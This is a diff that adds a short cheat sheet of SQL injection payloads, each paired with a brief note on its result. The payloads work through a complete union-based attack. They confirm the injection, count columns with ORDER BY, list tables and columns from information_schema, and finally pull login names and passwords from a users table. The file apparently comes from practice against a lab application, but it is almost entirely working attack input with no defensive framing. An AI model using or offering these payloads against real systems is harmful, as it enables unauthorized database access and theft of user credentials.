@@ -1,0 +1,39 @@
+' OR  1=1#
+    Display all data
+
+
+' OR 1=1 union select 1,database(),3,4,5,6,7#
+  Display Database Name with column Number
+
+
+' OR  1=1 ORDER BY 5#
+Checking in Increasing Order 
+
+
+' OR  1=1 ORDER BY 7#
+Checking the number of columns
+
+
+' OR  1=1 ORDER BY 8#
+Unknown Error in order clause
+
+        
+' OR  1=1 UNION SELECT 1,2,3,4,5,6,7#
+Display content with column Number
+
+
+' and  1=1 UNION SELECT 1,2,3,4,5,6,7#
+DIsplay column number only        No Extra Information
+
+
+' and 1=0 union select 1,table_name,3,4,5,6,7 from information_schema.tables#
+Display Table Names in Database 
+
+
+' and 1=0 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'#
+  Display columns using table name(users)
+
+
+' and 1=0 union select 1,id,login,4,password,6,7 from users# 
+ Display user names and password
+
